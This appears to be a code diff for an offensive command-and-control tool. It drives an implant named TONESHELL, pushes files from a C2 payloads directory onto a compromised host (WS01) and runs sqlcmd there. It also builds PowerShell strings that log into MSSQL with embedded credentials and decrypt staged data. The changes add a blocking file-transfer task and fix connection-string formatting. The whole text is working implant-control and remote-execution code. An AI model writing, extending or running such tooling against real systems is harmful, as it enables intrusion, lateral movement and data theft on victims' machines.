@@ -174,9 +174,9 @@ class XpMssql:
         sql_file = resp["sqlFile"]
         key_b64  = resp.get("key", "")
 
-        # Transfer INSERT SQL to WS01 via TONESHELL file download task
+        # Transfer INSERT SQL to WS01, block until implant confirms receipt
         remote_sql = f"C:\\Windows\\Temp\\{sql_file}"
-        shell.cmd_put(sql_file, remote_sql)
+        shell.cmd_put_wait(sql_file, remote_sql)
 
         # Run INSERT via sqlcmd -i (not subject to 2048 cmd limit)
         shell.cmd_exec_raw(f'{self._sqlcmd_prefix()} -i {remote_sql}')
@@ -196,8 +196,9 @@ class XpMssql:
         print(f"[+] xpstage done → {out_path}")
 
     def _build_decrypt_ps(self, key_b64: str, out_path: str) -> str:
-        # Use single-quoted PS strings throughout — no " in content avoids C-runtime escaping issues
-        connstr = f'Server={self._host};Database=tempdb;User ID={self._login};Password={self._password};TrustServerCertificate=True'
+        # SqlClient uses comma for port (host,port), sqlcmd uses colon — convert
+        sqlclient_host = self._host.replace(':', ',')
+        connstr = f'Server={sqlclient_host};Database=tempdb;User ID={self._login};Password={self._password};TrustServerCertificate=True'
         return (
             f"$k=[Convert]::FromBase64String('{key_b64}');"
             f"$cn=New-Object System.Data.SqlClient.SqlConnection('{connstr}');"
@@ -215,7 +216,8 @@ class XpMssql:
         )
 
     def _build_plain_ps(self, out_path: str) -> str:
-        connstr = f'Server={self._host};Database=tempdb;User ID={self._login};Password={self._password};TrustServerCertificate=True'
+        sqlclient_host = self._host.replace(':', ',')
+        connstr = f'Server={sqlclient_host};Database=tempdb;User ID={self._login};Password={self._password};TrustServerCertificate=True'
         return (
             f"$cn=New-Object System.Data.SqlClient.SqlConnection('{connstr}');"
             "$cn.Open();$cm=$cn.CreateCommand();"
@@ -335,6 +337,15 @@ class ToneShellShell:
         task     = {"id": TS_FILE_UPLOAD, "taskNum": task_num, "args": remote_path}
         info     = self._post_task(task)
         print(f"[*] file-get task {info[TASK_GUID_KEY]} queued (implant will push {remote_path})")
+
+    def cmd_put_wait(self, payload_name: str, remote_dest: str):
+        """Push a file to the implant and block until transfer is complete."""
+        task_num = self._next_task_num()
+        task     = {"id": TS_FILE_DOWNLOAD, "taskNum": task_num,
+                    "args": remote_dest, "payload": payload_name}
+        info     = self._post_task(task)
+        print(f"[*] file-put task {info[TASK_GUID_KEY]} queued, waiting for transfer …")
+        self._poll_output(info[TASK_GUID_KEY], timeout_s=180)
 
     def cmd_put(self, payload_name: str, remote_dest: str):
         """Push a file FROM the C2 server payloads dir TO the implant."""
